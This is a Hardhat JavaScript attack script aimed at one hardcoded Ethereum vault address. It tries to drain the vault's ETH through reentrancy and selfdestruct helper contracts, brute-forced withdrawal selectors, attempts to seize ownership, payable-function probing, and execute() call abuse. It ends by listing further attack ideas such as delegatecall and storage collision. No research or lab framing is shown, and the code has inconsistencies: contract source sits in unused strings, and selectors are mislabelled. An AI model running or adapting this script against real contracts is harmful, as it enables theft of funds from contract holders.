const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const IMPLEMENTATION_ADDRESS = "0x11fb858ee4bf594857483bcf86eb825aef1cbf91";

/**
 * @title ETH Extraction Focused Attack
 * @notice Specific techniques to extract ETH from the vault
 * @dev Explores reentrancy, selfdestruct, and other ETH-specific vectors
 */
async function main() {
  console.log("\n💎 ETH EXTRACTION FOCUSED ATTACK");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  
  // Initial state
  const initialVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  const initialAttackerETH = await ethers.provider.getBalance(attacker.address);
  
  console.log("\n📊 Initial State:");
  console.log("Vault ETH:", ethers.formatEther(initialVaultETH));
  console.log("Attacker ETH:", ethers.formatEther(initialAttackerETH));
  
  // Deploy attack contracts
  console.log("\n🚀 Deploying attack contracts...");
  
  // 1. Reentrancy Attack Contract
  const ReentrancyCode = `
  pragma solidity ^0.8.0;
  
  contract ReentrancyAttack {
    address payable public vault;
    address payable public owner;
    uint256 public attackCount;
    
    constructor(address payable _vault) {
      vault = _vault;
      owner = payable(msg.sender);
    }
    
    receive() external payable {
      if (attackCount < 10 && address(vault).balance > 0) {
        attackCount++;
        // Try various withdrawal patterns
        (bool s1,) = vault.call(abi.encodeWithSignature("withdraw()"));
        (bool s2,) = vault.call(abi.encodeWithSignature("withdrawETH()"));
        (bool s3,) = vault.call(abi.encodeWithSignature("emergencyWithdraw()"));
        (bool s4,) = vault.call(abi.encodeWithSignature("withdrawAll()"));
      }
    }
    
    function attack() external {
      attackCount = 0;
      // Try multiple attack vectors
      (bool s1,) = vault.call{value: 0}(abi.encodeWithSignature("withdraw()"));
      (bool s2,) = vault.call{value: 0}(abi.encodeWithSignature("execute(address,uint256,bytes)", address(this), 0, ""));
      (bool s3,) = vault.call{value: 0}("");
    }
    
    function drain() external {
      owner.transfer(address(this).balance);
    }
  }`;
  
  // 2. Selfdestruct Receiver Contract
  const SelfdestructReceiverCode = `
  pragma solidity ^0.8.0;
  
  contract SelfdestructReceiver {
    address payable public owner;
    
    constructor() {
      owner = payable(msg.sender);
    }
    
    receive() external payable {}
    
    function triggerVaultDestruct(address vault) external {
      // Try to trigger selfdestruct and receive funds
      (bool s1,) = vault.call(abi.encodeWithSignature("destroy()"));
      (bool s2,) = vault.call(abi.encodeWithSignature("kill()"));
      (bool s3,) = vault.call(abi.encodeWithSignature("destruct(address)", address(this)));
      (bool s4,) = vault.call(abi.encodeWithSignature("selfdestruct(address)", address(this)));
      
      // Try with implementation
      (bool s5,) = vault.call(abi.encodeWithSignature("destroy(address)", address(this)));
    }
    
    function withdraw() external {
      owner.transfer(address(this).balance);
    }
  }`;
  
  // Deploy contracts
  const ReentrancyFactory = await ethers.getContractFactory("ReentrancyAttack");
  const reentrancy = await ReentrancyFactory.deploy(VAULT_ADDRESS);
  await reentrancy.waitForDeployment();
  const reentrancyAddress = await reentrancy.getAddress();
  console.log("Reentrancy attacker deployed at:", reentrancyAddress);
  
  const ReceiverFactory = await ethers.getContractFactory("SelfdestructReceiver");
  const receiver = await ReceiverFactory.deploy();
  await receiver.waitForDeployment();
  const receiverAddress = await receiver.getAddress();
  console.log("Selfdestruct receiver deployed at:", receiverAddress);
  
  // Attack 1: Direct ETH withdrawal attempts
  console.log("\n🎯 Attack 1: Direct ETH withdrawal functions");
  
  const ethWithdrawSelectors = [
    "0x3ccfd60b", // withdraw()
    "0x4782f779", // withdrawETH()
    "0xe9fad8ee", // withdrawETH()
    "0x853828b6", // withdrawAll()
    "0xf14210a6", // withdrawETH(uint256)
    "0x5fd8c710", // withdrawBalance()
    "0xdb2e21bc", // emergencyWithdraw()
    "0x5312ea8e", // emergencyETH()
  ];
  
  for (const selector of ethWithdrawSelectors) {
    try {
      // Try with no params
      const tx1 = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: selector,
        gasLimit: 500000
      });
      await tx1.wait();
      
      const newBalance = await ethers.provider.getBalance(VAULT_ADDRESS);
      if (newBalance < initialVaultETH) {
        console.log(`✅ ${selector} extracted ${ethers.formatEther(initialVaultETH - newBalance)} ETH!`);
      }
    } catch (e) {}
    
    try {
      // Try with amount param
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["uint256"],
        [initialVaultETH]
      ).slice(2);
      
      const tx2 = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 500000
      });
      await tx2.wait();
      
      const newBalance2 = await ethers.provider.getBalance(VAULT_ADDRESS);
      if (newBalance2 < initialVaultETH) {
        console.log(`✅ ${selector}(amount) extracted ${ethers.formatEther(initialVaultETH - newBalance2)} ETH!`);
      }
    } catch (e) {}
  }
  
  // Attack 2: Reentrancy attack
  console.log("\n🎯 Attack 2: Reentrancy attack");
  try {
    await reentrancy.attack({ gasLimit: 2000000 });
    console.log("Reentrancy attack executed");
    
    const reentrancyBalance = await ethers.provider.getBalance(reentrancyAddress);
    if (reentrancyBalance > 0n) {
      console.log(`✅ Reentrancy captured ${ethers.formatEther(reentrancyBalance)} ETH!`);
      await reentrancy.drain();
    }
  } catch (e) {
    console.log("Reentrancy failed:", e.reason || "Unknown");
  }
  
  // Attack 3: Selfdestruct exploitation
  console.log("\n🎯 Attack 3: SELFDESTRUCT exploitation");
  
  // First become owner/admin
  const adminFunctions = [
    "0x13af4035", // setOwner
    "0xf2fde38b", // transferOwnership
    "0x8fc866da", // setAdmin
    "0x35f46994"  // setController
  ];
  
  for (const func of adminFunctions) {
    try {
      const data = func + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [receiverAddress]).slice(2);
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 100000
      });
      await tx.wait();
    } catch (e) {}
  }
  
  // Now trigger selfdestruct
  try {
    await receiver.triggerVaultDestruct(VAULT_ADDRESS);
    console.log("Selfdestruct triggers attempted");
    
    const receiverBalance = await ethers.provider.getBalance(receiverAddress);
    if (receiverBalance > 0n) {
      console.log(`✅ Selfdestruct captured ${ethers.formatEther(receiverBalance)} ETH!`);
      await receiver.withdraw();
    }
  } catch (e) {
    console.log("Selfdestruct failed:", e.reason || "Unknown");
  }
  
  // Attack 4: Payable function abuse
  console.log("\n🎯 Attack 4: Payable function abuse");
  
  // Get all selectors and test which are payable
  const vaultCode = await ethers.provider.getCode(VAULT_ADDRESS);
  const selectors = extractSelectors(vaultCode);
  
  console.log(`Testing ${selectors.length} selectors for payable ETH extraction...`);
  
  let payableFound = 0;
  for (const selector of selectors) {
    try {
      // Send small amount to test if payable
      const testTx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: selector,
        value: ethers.parseEther("0.001"),
        gasLimit: 100000
      });
      await testTx.wait();
      payableFound++;
      
      // If payable, try to extract
      try {
        const extractData = selector + ethers.AbiCoder.defaultAbiCoder().encode(
          ["uint256"],
          [initialVaultETH]
        ).slice(2);
        
        const extractTx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: extractData,
          gasLimit: 500000
        });
        await extractTx.wait();
      } catch (e) {}
    } catch (e) {}
  }
  
  console.log(`Found ${payableFound} payable functions`);
  
  // Attack 5: External call manipulation
  console.log("\n🎯 Attack 5: External call manipulation");
  
  const externalCallSelectors = [
    "0x1cff79cd", // execute(address,bytes)
    "0x7535d246", // executeCall(address,uint256,bytes)
    "0xb61d27f6", // execute(address,uint256,bytes)
  ];
  
  for (const selector of externalCallSelectors) {
    try {
      // Make vault call attacker with all its balance
      const callData = "0x"; // empty call to receive ETH
      
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256", "bytes"],
        [attacker.address, initialVaultETH, callData]
      ).slice(2);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 500000
      });
      await tx.wait();
      console.log(`${selector} executed`);
    } catch (e) {}
  }
  
  // Final check
  const finalVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  const finalAttackerETH = await ethers.provider.getBalance(attacker.address);
  
  console.log("\n📊 FINAL RESULTS:");
  console.log("=====================================");
  console.log("Vault ETH:", ethers.formatEther(finalVaultETH));
  console.log("ETH Extracted:", ethers.formatEther(initialVaultETH - finalVaultETH));
  
  if (finalVaultETH < initialVaultETH) {
    console.log("\n🎉 SUCCESS! Extracted", ethers.formatEther(initialVaultETH - finalVaultETH), "ETH");
    console.log("Extraction method discovered!");
  } else {
    console.log("\n❌ No ETH extracted yet");
    console.log("\nNext steps to try:");
    console.log("1. Analyze vault's fallback/receive functions");
    console.log("2. Check for delegatecall vulnerabilities");
    console.log("3. Storage collision attacks");
    console.log("4. Gas griefing attacks");
  }
}

function extractSelectors(bytecode) {
  const selectors = new Set();
  const pattern = /63([0-9a-f]{8})/g;
  let match;
  
  while ((match = pattern.exec(bytecode)) !== null) {
    selectors.add("0x" + match[1]);
  }
  
  return Array.from(selectors);
}

main().catch((error) => {
  console.error("\n💥 Script error:", error);
  process.exit(1);
});
